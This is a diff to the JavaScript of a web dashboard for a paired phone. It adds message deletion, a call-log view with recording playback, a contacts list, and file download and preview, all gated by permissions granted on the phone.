                 const kind = escapeHtml(it.type || "inbox");
-                return `<article class="msg-card">
-          <div class="msg-card-head">
-            <strong class="msg-who">${who}</strong>
-            <time class="msg-time">${when}</time>
+                return `<article class="msg-card" data-item-id="${id}">
+          <label class="msg-card-select">
+            <input type="checkbox" class="msg-check" data-item-id="${id}" />
+          </label>
+          <div class="msg-card-main">
+            <div class="msg-card-head">
+              <strong class="msg-who">${who}</strong>
+              <time class="msg-time">${when}</time>
+            </div>
+            <p class="msg-body">${body || '<span class="muted">(empty)</span>'}</p>
+            <div class="msg-meta">
+              <span>${kind}</span>
+              <button type="button" class="btn-danger-soft btn-msg-delete-one" data-item-id="${id}">Delete</button>
+            </div>
           </div>
-          <p class="msg-body">${body || '<span class="muted">(empty)</span>'}</p>
-          <div class="msg-meta"><span>${kind}</span></div>
         </article>`;
               })
               .join("")}</div>
@@ -3514,6 +5404,429 @@ async function refreshMessagesPanel() {
         }
       });
     });
+
+    const selectAll = document.getElementById("msg-select-all");
+    if (selectAll) {
+      selectAll.checked = false;
+      selectAll.onchange = () => {
+        list.querySelectorAll(".msg-check").forEach((cb) => {
+          cb.checked = selectAll.checked;
+        });
+        updateMessagesSelectionUi();
+      };
+    }
+    list.querySelectorAll(".msg-check").forEach((cb) => {
+      cb.addEventListener("change", () => updateMessagesSelectionUi());
+    });
+    list.querySelectorAll(".btn-msg-delete-one").forEach((btn) => {
+      btn.addEventListener("click", (ev) => {
+        ev.preventDefault();
+        ev.stopPropagation();
+        const id = btn.getAttribute("data-item-id") || "";
+        if (id) void deleteMessagesByIds([id]);
+      });
+    });
+    updateMessagesSelectionUi();
+  } catch (e) {
+    list.textContent = e instanceof Error ? e.message : String(e);
+    if (selectBar) selectBar.hidden = true;
+    if (btnDelete) btnDelete.disabled = true;
+  }
+}
+
+function updateMessagesSelectionUi() {
+  const list = document.getElementById("messages-list");
+  const btnDelete = document.getElementById("btn-msg-delete");
+  const countEl = document.getElementById("msg-selected-count");
+  const selectAll = document.getElementById("msg-select-all");
+  const checks = list ? [...list.querySelectorAll(".msg-check")] : [];
+  const selected = checks.filter((c) => c.checked);
+  if (countEl) countEl.textContent = `${selected.length} selected`;
+  if (btnDelete) btnDelete.disabled = selected.length === 0;
+  if (selectAll && checks.length) {
+    selectAll.checked = selected.length === checks.length;
+    selectAll.indeterminate = selected.length > 0 && selected.length < checks.length;
+  }
+}
+
+async function deleteMessagesByIds(itemIds) {
+  const ids = [...new Set((itemIds || []).map((id) => String(id || "").trim()).filter(Boolean))];
+  if (!ids.length) return;
+  const deviceId =
+    selectedWorkspaceDeviceId || document.getElementById("messages-device-select")?.value;
+  if (!deviceId) {
+    alert("No device selected.");
+    return;
+  }
+  const label =
+    ids.length === 1
+      ? "Delete this message from the website and the phone?"
+      : `Delete ${ids.length} messages from the website and the phone?`;
+  if (!window.confirm(label)) return;
+  const btnDelete = document.getElementById("btn-msg-delete");
+  if (btnDelete) btnDelete.disabled = true;
+  try {
+    const clientId = requireClientId();
+    await api("/api/device/messages/delete", {
+      method: "POST",
+      body: JSON.stringify({ deviceId, clientId, itemIds: ids }),
+    });
+    await refreshMessagesPanel();
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    if (/messagesList|CAPABILITY_DENIED|MESSAGES_DISABLED|PERMISSION_DENIED|lacks capability/i.test(msg)) {
+      alert(
+        "Cannot delete SMS yet.\n\n" +
+          "1) Phone → Permissions → SMS / Messages → allow\n" +
+          "2) Trusted browsers → allow reading SMS / messages\n\n" +
+          msg
+      );
+    } else {
+      alert(msg);
+    }
+    updateMessagesSelectionUi();
+  }
+}
+
+function callTypeLabel(type) {
+  const t = String(type || "").toLowerCase();
+  const map = {
+    incoming: "Incoming",
+    outgoing: "Outgoing",
+    missed: "Missed",
+    voicemail: "Voicemail",
+    rejected: "Rejected",
+    blocked: "Blocked",
+    answered_externally: "Answered elsewhere",
+  };
+  return map[t] || (t ? t.replace(/_/g, " ") : "Unknown");
+}
+
+function callTypeClass(type) {
+  const t = String(type || "").toLowerCase();
+  if (t === "incoming") return "call-type-incoming";
+  if (t === "outgoing") return "call-type-outgoing";
+  if (t === "missed") return "call-type-missed";
+  if (t === "voicemail") return "call-type-voicemail";
+  if (t === "rejected") return "call-type-rejected";
+  if (t === "blocked") return "call-type-blocked";
+  if (t === "answered_externally") return "call-type-external";
+  return "call-type-other";
+}
+
+function formatCallDateTime(ms) {
+  const n = Number(ms || 0);
+  if (!n) return "—";
+  try {
+    return new Date(n).toLocaleString(undefined, {
+      year: "numeric",
+      month: "short",
+      day: "numeric",
+      hour: "numeric",
+      minute: "2-digit",
+      second: "2-digit",
+      hour12: true,
+    });
+  } catch {
+    return String(n);
+  }
+}
+
+function formatCallDuration(sec) {
+  const s = Math.max(0, Number(sec || 0));
+  if (!s) return "0s";
+  const h = Math.floor(s / 3600);
+  const m = Math.floor((s % 3600) / 60);
+  const r = s % 60;
+  if (h > 0) return `${h}h ${m}m ${r}s`;
+  if (m > 0) return `${m}m ${r}s`;
+  return `${r}s`;
+}
+
+async function refreshCallLogsPanel() {
+  if (!cachedDevices.length) await refreshDevices().catch(() => {});
+  fillWorkspaceDeviceSelect();
+  syncHiddenDeviceSelects(selectedWorkspaceDeviceId);
+  const deviceId =
+    selectedWorkspaceDeviceId || document.getElementById("call-logs-device-select")?.value;
+  const list = document.getElementById("call-logs-list");
+  if (!list) return;
+  if (!deviceId) {
+    list.textContent = "No devices.";
+    return;
+  }
+  list.textContent = "Loading call logs...";
+  try {
+    const data = await api(
+      `/api/device/call-logs?deviceId=${encodeURIComponent(deviceId)}&limit=150`
+    );
+    const items = data.items || [];
+    if (!items.length) {
+      list.classList.add("muted");
+      list.textContent =
+        "No call logs yet.\n\n" +
+        "On the phone: Permissions → Call logs → allow.\n" +
+        "Trusted browsers → allow reading call logs.\n" +
+        "Then Sync from phone.";
+      return;
+    }
+    list.classList.remove("muted");
+    const groups = groupItemsByDay(items, "date");
+    list.innerHTML = `<div class="call-day-list">${groups
+      .map(([dayKey, dayItems], index) => {
+        const open = index === 0 ? " is-open" : "";
+        const hidden = index === 0 ? "" : " hidden";
+        const chevron = index === 0 ? "▲" : "▼";
+        const count = dayItems.length;
+        return `<section class="call-day-group${open}" data-day="${escapeHtml(dayKey)}">
+          <button type="button" class="call-day-header" aria-expanded="${index === 0 ? "true" : "false"}">
+            <span class="call-day-title">${escapeHtml(notifDayLabel(dayKey))}</span>
+            <span class="call-day-count">${count}</span>
+            <span class="call-day-chevron" aria-hidden="true">${chevron}</span>
+          </button>
+          <div class="call-day-body"${hidden}>
+            <div class="call-grid">${dayItems
+              .map((it) => {
+                const type = String(it.callType || "incoming");
+                const typeLabel = escapeHtml(callTypeLabel(type));
+                const typeCls = callTypeClass(type);
+                const name = String(it.contactName || "").trim();
+                const number = String(it.number || "").trim() || "(unknown)";
+                const who = name
+                  ? `${escapeHtml(name)} · ${escapeHtml(number)}`
+                  : escapeHtml(number);
+                const when = escapeHtml(formatCallDateTime(it.date));
+                const dur = escapeHtml(formatCallDuration(it.durationSec));
+                const geo = String(it.geo || "").trim();
+                const playable = isCallRecordingPlayable(it);
+                const recStatus = String(it.recordingStatus || "none").toLowerCase();
+                const showPlaySlot = type === "incoming" || type === "outgoing";
+                let playHtml = "";
+                if (showPlaySlot) {
+                  if (playable) {
+                    playHtml = `<button type="button" class="btn-call-play" data-item-id="${escapeHtml(it.itemId || "")}" data-device-id="${escapeHtml(deviceId)}" title="Play call recording">▶ Play</button>`;
+                  } else if (recStatus === "uploading" || recStatus === "pending") {
+                    playHtml = `<span class="call-rec-status call-rec-pending">Uploading…</span>`;
+                  } else if (recStatus === "failed") {
+                    const err = String(it.recordingError || "Upload failed").trim();
+                    playHtml = `<span class="call-rec-status call-rec-failed" title="${escapeHtml(err)}">Recording failed${err ? `: ${escapeHtml(err.slice(0, 120))}` : ""}</span>`;
+                  } else if (Number(it.durationSec || 0) > 0) {
+                    playHtml = `<span class="call-rec-status">No recording yet — phone needs Call logs + Phone + Mic, then remake the call</span>`;
+                  } else {
+                    playHtml = `<span class="call-rec-status muted">—</span>`;
+                  }
+                }
+                return `<article class="call-card" data-item-id="${escapeHtml(it.itemId || "")}">
+          <div class="call-card-head">
+            <strong class="call-who">${who}</strong>
+            <span class="call-type ${typeCls}">${typeLabel}</span>
+          </div>
+          <div class="call-meta">
+            <time class="call-time">${when}</time>
+            <span class="call-duration">Duration ${dur}</span>
+            ${geo ? `<span class="call-geo">${escapeHtml(geo)}</span>` : ""}
+          </div>
+          ${playHtml ? `<div class="call-actions">${playHtml}</div>` : ""}
+        </article>`;
+              })
+              .join("")}</div>
+          </div>
+        </section>`;
+      })
+      .join("")}</div>`;
+
+    list.querySelectorAll(".call-day-header").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const group = btn.closest(".call-day-group");
+        const body = group?.querySelector(".call-day-body");
+        const chevron = btn.querySelector(".call-day-chevron");
+        if (!group || !body) return;
+        const opening = body.hasAttribute("hidden");
+        if (opening) {
+          body.removeAttribute("hidden");
+          group.classList.add("is-open");
+          btn.setAttribute("aria-expanded", "true");
+          if (chevron) chevron.textContent = "▲";
+        } else {
+          body.setAttribute("hidden", "");
+          group.classList.remove("is-open");
+          btn.setAttribute("aria-expanded", "false");
+          if (chevron) chevron.textContent = "▼";
+        }
+      });
+    });
+    list.querySelectorAll(".btn-call-play").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const itemId = btn.getAttribute("data-item-id") || "";
+        const devId = btn.getAttribute("data-device-id") || deviceId;
+        const row = (items || []).find((x) => String(x.itemId) === itemId);
+        playCallRecording(devId, row || { itemId }, btn).catch((e) => {
+          alert(e instanceof Error ? e.message : String(e));
+        });
+      });
+    });
+  } catch (e) {
+    list.textContent = e instanceof Error ? e.message : String(e);
+  }
+}
+
+function isCallRecordingPlayable(it) {
+  if (!it) return false;
+  if (String(it.recordingStatus || "").toLowerCase() !== "ready") return false;
+  return Boolean(
+    String(it.recordingUrl || "").trim() ||
+      String(it.recordingContentUrl || "").trim() ||
+      String(it.recordingStoragePath || "").trim()
+  );
+}
+
+async function playCallRecording(deviceId, item, buttonEl) {
+  const itemId = String(item?.itemId || "").trim();
+  if (!deviceId || !itemId) throw new Error("Missing call recording id");
+  const prev = buttonEl?.textContent;
+  if (buttonEl) {
+    buttonEl.disabled = true;
+    buttonEl.textContent = "Loading…";
+  }
+  try {
+    // Always use authenticated content proxy → blob URL.
+    // Firebase signed URLs often fail in <audio> due to CORS (shows 0:00/0:00).
+    const contentPath =
+      String(item.recordingContentUrl || "").trim() ||
+      `/api/device/call-logs/recording?deviceId=${encodeURIComponent(deviceId)}&itemId=${encodeURIComponent(itemId)}`;
+    const res = await fetch(contentPath, {
+      headers: idToken ? { Authorization: `Bearer ${idToken}` } : {},
+    });
+    if (!res.ok) {
+      const body = await res.json().catch(() => ({}));
+      throw new Error(body.error || `Recording HTTP ${res.status}`);
+    }
+    const headerMime = String(res.headers.get("content-type") || "").split(";")[0].trim();
+    const buf = await res.arrayBuffer();
+    if (!buf || buf.byteLength < 64) {
+      throw new Error("Recording file is empty or too small");
+    }
+    const sniffed = sniffAudioMime(buf, headerMime || item.recordingMimeType || "");
+    const pathHint = String(item.recordingStoragePath || item.fileName || "").toLowerCase();
+    let mime = sniffed.mime;
+    let ext = sniffed.ext;
+    if (!ext) {
+      if (pathHint.endsWith(".3gp")) ext = "3gp";
+      else if (pathHint.endsWith(".amr")) ext = "amr";
+      else if (pathHint.endsWith(".mp3")) ext = "mp3";
+      else if (pathHint.endsWith(".wav")) ext = "wav";
+      else ext = "m4a";
+    }
+    if (!mime || mime === "application/octet-stream") {
+      mime =
+        ext === "3gp" || ext === "amr"
+          ? "audio/3gpp"
+          : ext === "mp3"
+            ? "audio/mpeg"
+            : ext === "wav"
+              ? "audio/wav"
+              : "audio/mp4";
+    }
+    const blob = new Blob([buf], { type: mime });
+    const url = URL.createObjectURL(blob);
+    const browserPlayable = isBrowserPlayableAudio(mime, ext);
+    openMediaViewer({
+      kind: "audio",
+      mimeType: mime,
+      contentType: mime,
+      downloadUrl: url,
+      displayName: `call-${itemId.slice(0, 10)}`,
+      fileName: `call-${itemId.slice(0, 10)}.${ext}`,
+      browserPlayable,
+    });
+  } finally {
+    if (buttonEl) {
+      buttonEl.disabled = false;
+      buttonEl.textContent = prev || "▶ Play";
+    }
+  }
+}
+
+function isBrowserPlayableAudio(mime, ext) {
+  const m = String(mime || "").toLowerCase();
+  const e = String(ext || "").toLowerCase();
+  if (e === "3gp" || e === "amr" || m.includes("3gpp") || m.includes("amr")) return false;
+  return true;
+}
+
+function sniffAudioMime(buf, fallbackMime) {
+  const u8 = new Uint8Array(buf);
+  // AMR: "#!AMR" or "#!AMR-WB"
+  if (u8.length >= 5) {
+    const head = String.fromCharCode(u8[0], u8[1], u8[2], u8[3], u8[4]);
+    if (head.startsWith("#!AMR")) return { mime: "audio/amr", ext: "amr" };
+  }
+  // 3GP/MP4 ftyp box
+  if (u8.length >= 12 && u8[4] === 0x66 && u8[5] === 0x74 && u8[6] === 0x79 && u8[7] === 0x70) {
+    const brand = String.fromCharCode(u8[8], u8[9], u8[10], u8[11]).toLowerCase();
+    if (brand.includes("3gp") || brand.includes("3g2")) return { mime: "audio/3gpp", ext: "3gp" };
+    return { mime: "audio/mp4", ext: "m4a" };
+  }
+  // WAV
+  if (u8.length >= 12) {
+    const riff = String.fromCharCode(u8[0], u8[1], u8[2], u8[3]);
+    const wave = String.fromCharCode(u8[8], u8[9], u8[10], u8[11]);
+    if (riff === "RIFF" && wave === "WAVE") return { mime: "audio/wav", ext: "wav" };
+  }
+  // MP3 ID3 or frame sync
+  if (u8.length >= 3) {
+    if (u8[0] === 0x49 && u8[1] === 0x44 && u8[2] === 0x33) return { mime: "audio/mpeg", ext: "mp3" };
+    if (u8[0] === 0xff && (u8[1] & 0xe0) === 0xe0) return { mime: "audio/mpeg", ext: "mp3" };
+  }
+  const fb = String(fallbackMime || "").toLowerCase();
+  if (fb.includes("3gpp") || fb.includes("amr")) return { mime: fb || "audio/3gpp", ext: "3gp" };
+  if (fb.includes("mpeg") || fb.includes("mp3")) return { mime: "audio/mpeg", ext: "mp3" };
+  if (fb.includes("wav")) return { mime: "audio/wav", ext: "wav" };
+  if (fb.includes("mp4") || fb.includes("m4a") || fb.includes("aac")) return { mime: "audio/mp4", ext: "m4a" };
+  return { mime: fb || "audio/mp4", ext: "m4a" };
+}
+
+async function refreshContactsPanel() {
+  if (!cachedDevices.length) await refreshDevices().catch(() => {});
+  fillWorkspaceDeviceSelect();
+  syncHiddenDeviceSelects(selectedWorkspaceDeviceId);
+  const deviceId =
+    selectedWorkspaceDeviceId || document.getElementById("contacts-device-select")?.value;
+  const list = document.getElementById("contacts-list");
+  if (!list) return;
+  if (!deviceId) {
+    list.textContent = "No devices.";
+    return;
+  }
+  const q = String(document.getElementById("contacts-search")?.value || "").trim();
+  list.textContent = "Loading contacts...";
+  try {
+    const qs = new URLSearchParams({ deviceId, limit: "1000" });
+    if (q) qs.set("q", q);
+    const data = await api(`/api/device/contacts?${qs.toString()}`);
+    const items = data.items || [];
+    if (!items.length) {
+      list.classList.add("muted");
+      list.textContent =
+        "No contacts yet.\n\n" +
+        "On the phone: Permissions → Contacts → allow.\n" +
+        "Trusted browsers → allow reading contacts.\n" +
+        "Then Sync from phone.";
+      return;
+    }
+    list.classList.remove("muted");
+    list.innerHTML = `<div class="contacts-grid">${items
+      .map((it) => {
+        const name = escapeHtml(String(it.displayName || "").trim() || "(No name)");
+        const number = escapeHtml(String(it.number || "").trim() || "—");
+        const phoneType = escapeHtml(String(it.phoneType || "other"));
+        return `<article class="contact-card">
+          <strong class="contact-name">${name}</strong>
+          <div class="contact-number">${number}</div>
+          <div class="contact-meta">${phoneType}</div>
+        </article>`;
+      })
+      .join("")}</div>`;
   } catch (e) {
     list.textContent = e instanceof Error ? e.message : String(e);
   }
@@ -3523,6 +5836,285 @@ function isAudioEntry(entry) {
   const mime = String(entry.mimeType || "").toLowerCase();
   const name = String(entry.name || "").toLowerCase();
   return mime.startsWith("audio/") || /\.(mp3|m4a|aac|wav|ogg|flac|wma)$/i.test(name);
+}
+
+function isImageEntry(entry) {
+  const mime = String(entry.mimeType || "").toLowerCase();
+  const name = String(entry.name || "").toLowerCase();
+  return mime.startsWith("image/") || /\.(jpg|jpeg|png|gif|webp|bmp|heic)$/i.test(name);
+}
+
+function isVideoEntry(entry) {
+  const mime = String(entry.mimeType || "").toLowerCase();
+  const name = String(entry.name || "").toLowerCase();
+  return mime.startsWith("video/") || /\.(mp4|webm|mkv|mov|3gp)$/i.test(name);
+}
+
+function filesMediaKind(entry) {
+  if (isImageEntry(entry)) return "image";
+  if (isVideoEntry(entry)) return "video";
+  if (isAudioEntry(entry)) return "audio";
+  return "file";
+}
+
+function filesCacheKey(deviceId, entry) {
+  const rel = normalizeFilesPath(entry.relativePath || entry.name || "");
+  const grant = String(entry.folderGrantId || filesBrowse.grantId || "");
+  return `file::${deviceId}::${grant}::${rel}`;
+}
+
+function filesActionLabel(entry) {
+  const kind = filesMediaKind(entry);
+  if (kind === "image") return "View";
+  if (kind === "video" || kind === "audio") return "Play";
+  return "Download";
+}
+
+/** @type {Map<string, { status: string, progress: number, mimeType: string, displayName: string, type: string, objectUrl?: string, blob?: Blob }>} */
+const filesItemState = new Map();
+let filesPanelRenderKey = "";
+
+function setFilesSyncStatus(text) {
+  const el = document.getElementById("files-sync-status");
+  if (!el) return;
+  const msg = String(text || "").trim();
+  el.textContent = msg;
+  el.hidden = !msg;
+}
+
+function paintFilesButton(btn, state) {
+  if (!btn) return;
+  const card = btn.closest(".file-card");
+  btn.classList.remove("btn-file-progress", "btn-file-ready", "btn-file-error");
+  card?.classList.remove("file-card-downloading", "file-card-ready", "file-card-error");
+  if (state?.status === "downloading") {
+    const p = Math.max(0, Math.min(100, Number(state.progress) || 0));
+    btn.textContent = `${p}%`;
+    btn.disabled = true;
+    btn.classList.add("btn-file-progress");
+    btn.style.setProperty("--file-progress", `${p}%`);
+    card?.classList.add("file-card-downloading");
+    return;
+  }
+  btn.disabled = false;
+  btn.style.removeProperty("--file-progress");
+  if (state?.status === "ready") {
+    btn.textContent = filesActionLabel({
+      mimeType: state.mimeType,
+      name: state.displayName,
+    });
+    btn.classList.add("btn-file-ready");
+    card?.classList.add("file-card-ready");
+    return;
+  }
+  if (state?.status === "error") {
+    btn.textContent = "Retry";
+    btn.classList.add("btn-file-error");
+    card?.classList.add("file-card-error");
+    return;
+  }
+  btn.textContent = "Download";
+}
+
+async function cacheFilesBlob(key, meta, blob) {
+  await galleryCachePut({
+    key,
+    blob,
+    mimeType: meta.mimeType || blob.type || "application/octet-stream",
+    displayName: meta.displayName || meta.name || "file",
+    type: meta.type || filesMediaKind(meta),
+    sizeBytes: meta.sizeBytes || blob.size || 0,
+    savedAt: Date.now(),
+  });
+  const prev = filesItemState.get(key);
+  if (prev?.objectUrl) {
+    try {
+      URL.revokeObjectURL(prev.objectUrl);
+    } catch {
+      /* ignore */
+    }
+  }
+  const state = {
+    status: "ready",
+    progress: 100,
+    mimeType: meta.mimeType || blob.type || "application/octet-stream",
+    displayName: meta.displayName || meta.name || "file",
+    type: meta.type || filesMediaKind(meta),
+    objectUrl: URL.createObjectURL(blob),
+    blob,
+  };
+  filesItemState.set(key, state);
+  return state;
+}
+
+function closeFilesInlineViewer() {
+  const wrap = document.getElementById("files-inline-viewer");
+  const body = document.getElementById("files-inline-body");
+  if (body) body.innerHTML = "";
+  if (wrap) wrap.hidden = true;
+}
+
+async function showFilesInlinePreview(key) {
+  const state = filesItemState.get(key);
+  if (!state || state.status !== "ready") return;
+  const url = state.objectUrl || (await ensureGalleryObjectUrl(key, state));
+  const wrap = document.getElementById("files-inline-viewer");
+  const body = document.getElementById("files-inline-body");
+  const title = document.getElementById("files-inline-title");
+  if (!wrap || !body) return;
+  if (title) title.textContent = state.displayName || "Preview";
+  body.innerHTML = "";
+  const mime = String(state.mimeType || "").toLowerCase();
+  const kind = state.type || filesMediaKind({ mimeType: mime, name: state.displayName });
+  if (kind === "image") {
+    const img = document.createElement("img");
+    img.src = url;
+    img.alt = state.displayName || "image";
+    body.appendChild(img);
+  } else if (kind === "video") {
+    const video = document.createElement("video");
+    video.src = url;
+    video.controls = true;
+    video.playsInline = true;
+    video.preload = "metadata";
+    body.appendChild(video);
+    video.play().catch(() => {});
+  } else if (kind === "audio") {
+    const audio = document.createElement("audio");
+    audio.src = url;
+    audio.controls = true;
+    audio.preload = "metadata";
+    body.appendChild(audio);
+    audio.play().catch(() => {});
+  } else {
+    const link = document.createElement("a");
+    link.href = url;
+    link.download = state.displayName || "file";
+    link.className = "btn-secondary";
+    link.textContent = "Download file";
+    body.appendChild(link);
+  }
+  wrap.hidden = false;
+  wrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
+}
+
+async function findReadyFileTransfer(deviceId, entry) {
+  const data = await api(`/api/device/transfers?deviceId=${encodeURIComponent(deviceId)}`);
+  const rows = data.transfers || [];
+  const rel = normalizeFilesPath(entry.relativePath || entry.name || "");
+  const docId = String(entry.documentId || entry.name || "");
+  return (
+    rows.find(
+      (t) =>
+        String(t.deviceId || "") === deviceId &&
+        t.status === "ready" &&
+        (t.storagePath || t.downloadUrl) &&
+        (String(t.sourceReference || "") === docId ||
+          normalizeFilesPath(t.relativePath || "") === rel)
+    ) || null
+  );
+}
+
+async function downloadFileItem(deviceId, entry, btn) {
+  const key = filesCacheKey(deviceId, entry);
+  const existing = filesItemState.get(key);
+  if (existing?.status === "ready") {
+    paintFilesButton(btn, existing);
+    await showFilesInlinePreview(key);
+    return;
+  }
+  const cached = await galleryCacheGet(key);
+  if (cached?.blob) {
+    const state = await cacheFilesBlob(
+      key,
+      {
+        ...entry,
+        mimeType: cached.mimeType || entry.mimeType,
+        displayName: cached.displayName || entry.name,
+        type: cached.type || filesMediaKind(entry),
+      },
+      cached.blob
+    );
+    paintFilesButton(btn, state);
+    await showFilesInlinePreview(key);
+    return;
+  }
+
+  let state = {
+    status: "downloading",
+    progress: 3,
+    mimeType: entry.mimeType || "application/octet-stream",
+    displayName: entry.name || "file",
+    type: filesMediaKind(entry),
+  };
+  filesItemState.set(key, state);
+  paintFilesButton(btn, state);
+  setFilesSyncStatus(`Downloading ${entry.name || "file"}…`);
+
+  try {
+    let transfer = await findReadyFileTransfer(deviceId, entry);
+    let transferId = transfer?.transferId || "";
+    let commandId = null;
+    if (!transfer) {
+      const clientId = requireClientId();
+      const res = await api("/api/device/files/command", {
+        method: "POST",
+        body: JSON.stringify({
+          deviceId,
+          clientId,
+          action: "FILE_DOWNLOAD_REQUEST",
+          folderGrantId: entry.folderGrantId,
+          documentId: entry.documentId || entry.name,
+          relativePath: entry.relativePath || entry.name,
+          sizeBytes: entry.sizeBytes || 0,
+          mimeType: entry.mimeType || "application/octet-stream",
+          displayName: entry.name,
+          payload: {
+            folderGrantId: entry.folderGrantId,
+            relativePath: entry.relativePath || entry.name,
+          },
+        }),
+      });
+      transferId = res.transfer?.transferId || "";
+      commandId = res.commandId || res.transfer?.commandId || null;
+      if (!transferId) throw new Error("Download did not start");
+    }
+
+    transfer = await pollGalleryTransfer(deviceId, transferId, commandId, (progress) => {
+      const p = Math.max(3, Math.min(99, Number(progress) || 3));
+      state = { ...state, status: "downloading", progress: p };
+      filesItemState.set(key, state);
+      paintFilesButton(btn, state);
+      setFilesSyncStatus(`Downloading ${entry.name || "file"}… ${p}%`);
+    });
+
+    const blob = await fetchTransferBlob(transfer);
+    const ready = await cacheFilesBlob(
+      key,
+      {
+        ...entry,
+        mimeType: transfer.mimeType || entry.mimeType || blob.type,
+        displayName: entry.name || "file",
+        type: filesMediaKind(entry),
+        sizeBytes: blob.size,
+      },
+      blob
+    );
+    paintFilesButton(btn, ready);
+    setFilesSyncStatus("");
+    await showFilesInlinePreview(key);
+  } catch (e) {
+    state = {
+      ...state,
+      status: "error",
+      progress: 0,
+      error: e instanceof Error ? e.message : String(e),
+    };
+    filesItemState.set(key, state);
+    paintFilesButton(btn, state);
+    setFilesSyncStatus("");
+    throw e;
+  }
 }
 
 /** @type {{ grantId: string, relativePath: string }} */
@@ -3569,6 +6161,8 @@ async function listFilesFolder(deviceId, grantId, relativePath = "") {
   const path = normalizeFilesPath(relativePath);
   filesBrowse = { grantId, relativePath: path };
   updateFilesBreadcrumb();
+  closeFilesInlineViewer();
+  setFilesSyncStatus(`Listing ${path || "root"}…`);
   await api("/api/device/files/command", {
     method: "POST",
     body: JSON.stringify({
@@ -3580,80 +6174,27 @@ async function listFilesFolder(deviceId, grantId, relativePath = "") {
       payload: { folderGrantId: grantId, relativePath: path },
     }),
   });
-  // Wait for phone to write index, then show.
-  for (let i = 0; i < 8; i++) {
-    await new Promise((r) => setTimeout(r, 700));
-    await refreshFilesPanel();
-    const body = document.getElementById("files-panel-body");
-    if (body && !/Loading|Empty — tap List/i.test(body.textContent || "")) break;
+  const body = document.getElementById("files-panel-body");
+  const hasGrid = Boolean(body?.querySelector(".files-grid"));
+  await refreshFilesPanel({ silent: hasGrid });
+  for (let i = 0; i < 10; i++) {
+    await new Promise((r) => setTimeout(r, 650));
+    const hasEntries = await refreshFilesPanel({ silent: true });
+    if (hasEntries) break;
+    const folderCards = body?.querySelectorAll(".file-folder").length || 0;
+    if (folderCards > 0) break;
+    const text = body?.textContent || "";
+    if (i >= 2 && body?.querySelector("ul") && !/still loading/i.test(text)) break;
   }
+  setFilesSyncStatus("");
 }
 
-async function requestFileDownload(deviceId, entry, { play } = { play: false }) {
-  const clientId = requireClientId();
-  const res = await api("/api/device/files/command", {
-    method: "POST",
-    body: JSON.stringify({
-      deviceId,
-      clientId,
-      action: "FILE_DOWNLOAD_REQUEST",
-      folderGrantId: entry.folderGrantId,
-      documentId: entry.documentId || entry.name,
-      relativePath: entry.relativePath || entry.name,
-      sizeBytes: entry.sizeBytes || 0,
-      mimeType: entry.mimeType || "audio/mpeg",
-      displayName: entry.name,
-      payload: {
-        folderGrantId: entry.folderGrantId,
-        relativePath: entry.relativePath || entry.name,
-      },
-    }),
-  });
-  const transferId = res.transfer?.transferId;
-  if (!transferId) {
-    alert("Download did not start. Try again.");
-    return;
-  }
-  const label = document.getElementById("files-audio-label");
-  if (label) label.textContent = play ? `Preparing ${entry.name}…` : `Downloading ${entry.name}…`;
-  for (let i = 0; i < 20; i++) {
-    await new Promise((r) => setTimeout(r, 1500));
-    const data = await api(`/api/device/transfers?deviceId=${encodeURIComponent(deviceId)}`);
-    const t = (data.transfers || []).find((x) => x.transferId === transferId);
-    if (!t) continue;
-    if (t.status === "ready" && (t.downloadUrl || t.storagePath)) {
-      let url = t.downloadUrl || "";
-      if (!url && t.storagePath && storage) {
-        try {
-          const blob = await getBlob(storageRef(storage, t.storagePath));
-          url = URL.createObjectURL(blob);
-        } catch {
-          /* keep empty */
-        }
-      }
-      if (!url) continue;
-      if (play) {
-        const wrap = document.getElementById("files-audio-player");
-        const audio = document.getElementById("files-audio");
-        if (wrap) wrap.hidden = false;
-        if (label) label.textContent = entry.name;
-        if (audio) {
-          audio.src = url;
-          audio.play().catch(() => {});
-        }
-      } else {
-        window.open(url, "_blank", "noopener");
-      }
-      return;
-    }
-    if (t.status === "failed" || t.status === "cancelled") {
-      throw new Error(t.error || `Transfer ${t.status}`);
-    }
-  }
-  alert("Still preparing. Wait a moment and try again.");
-}
-
-async function refreshFilesPanel() {
+/**
+ * @param {{ silent?: boolean }} [options]
+ * @returns {Promise<boolean>} true when folder entries are shown
+ */
+async function refreshFilesPanel(options = {}) {
+  const silent = Boolean(options.silent);
   if (!cachedDevices.length) await refreshDevices().catch(() => {});
   fillWorkspaceDeviceSelect();
   syncHiddenDeviceSelects(selectedWorkspaceDeviceId);
@@ -3662,10 +6203,12 @@ async function refreshFilesPanel() {
   if (!body) return;
   if (!deviceId) {
     body.textContent = "No devices.";
-    return;
+    return false;
   }
   updateFilesBreadcrumb();
-  body.textContent = "Loading…";
+  if (!silent) {
+    body.textContent = "Loading…";
+  }
   try {
     const data = await api(`/api/device/files?deviceId=${encodeURIComponent(deviceId)}`);
     const folders = data.folders || [];
@@ -3690,6 +6233,19 @@ async function refreshFilesPanel() {
           sensitivity: "base",
         });
       });
+
+    const renderKey = JSON.stringify({
+      deviceId,
+      grantId,
+      curPath,
+      folders: folders.map((f) => `${f.grantId}:${f.connected}`),
+      entries: entries.map((e) => `${e.relativePath || e.name}:${e.sizeBytes}:${e.isDirectory}`),
+    });
+    const hasEntries = entries.length > 0;
+    if (silent && renderKey === filesPanelRenderKey && body.querySelector(".files-grid")) {
+      return hasEntries;
+    }
+    filesPanelRenderKey = renderKey;
 
     body.innerHTML = `
       <h3>Authorized folders</h3>
@@ -3717,13 +6273,38 @@ async function refreshFilesPanel() {
                   </button>`;
                 }
                 const audio = isAudioEntry(e);
+                const image = isImageEntry(e);
+                const video = isVideoEntry(e);
                 const meta = `${escapeHtml(e.mimeType || "file")} · ${Math.round((e.sizeBytes || 0) / 1024)} KB`;
-                return `<article class="file-card" data-file-idx="${idx}">
+                const key = filesCacheKey(deviceId, e);
+                const st = filesItemState.get(key);
+                let btnLabel = "Download";
+                let btnClass = "btn-secondary btn-file-dl";
+                let cardClass = "file-card";
+                if (st?.status === "downloading") {
+                  btnLabel = `${Math.max(0, Math.min(100, Number(st.progress) || 0))}%`;
+                  btnClass += " btn-file-progress";
+                  cardClass += " file-card-downloading";
+                } else if (st?.status === "ready") {
+                  btnLabel = filesActionLabel(e);
+                  btnClass += " btn-file-ready";
+                  cardClass += " file-card-ready";
+                } else if (st?.status === "error") {
+                  btnLabel = "Retry";
